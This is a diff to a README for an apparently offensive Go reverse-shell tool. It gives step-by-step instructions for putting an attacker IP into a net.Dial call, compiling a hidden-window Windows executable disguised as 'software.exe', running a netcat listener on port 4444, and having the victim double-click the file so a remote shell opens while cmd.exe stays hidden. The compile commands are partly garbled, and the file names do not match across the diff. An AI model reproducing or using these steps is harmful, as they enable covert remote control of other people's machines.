@@ -9,7 +9,7 @@ can be used for gain access into machines you don't have permissions. Please, al
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-💥 one single feature
+💥 two single features
 
  > The payload hides "cmd.exe". Therefore, the victim does not realize that he has been infected except for Windows Defender
 
@@ -19,34 +19,38 @@ can be used for gain access into machines you don't have permissions. Please, al
 
 ⚙️  How to activate?
 
- Since you've cloned the repo. Just navigate into it and execute the command "nano reverse_shell.go". Then, replace the part
+ Since you've cloned the repo. Just navigate into it and execute the command:
+
+
+  > nano payload.go
+  
+
+ then change te part:
+   
  
-  > net.Dial("tcp", "Put_attacker_ip_machine:4444")
+  > net.Dial("tcp", "LAN_IPV4:4444")
 
 
  to:  
 
 
-  >  your attacker IP_MACHINE in the part "Put_attacker_ip_machine" and keep the port 4444.
+  >  net.Dial("tcp," "192.168.1.101:4444")
  
 
-  expected :  
-
-
-  >  net.Dial("tcp", "192.168.1.101:4444) 
+ Expecting your attacker IP machine. 
   
   
  Next that, compile with :
  
   >  GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe reverse_shell.go 
  
-🚫 If compile does no run successfully :
+🚫 If compile give any error, try :
 
   >  GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe reverse_shell.go "
  
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-👾 How i infect the target ?
+👾 How to infect the target ?
 
  Firts, make sure you have installed python3.
  
@@ -80,11 +84,13 @@ can be used for gain access into machines you don't have permissions. Please, al
 
   > sudo nc -lvnp 4444
 
-  expected output : Listening on 0.0.0.0 4444
+  expected output : 
+
+  > Listening on 0.0.0.0 4444
 
  Just double click on software.exe in target machine and...
 
-✅ Stablished conection. 
+✅ Conection stablished
  
 📹 see demo in **demo.mp4** 
 
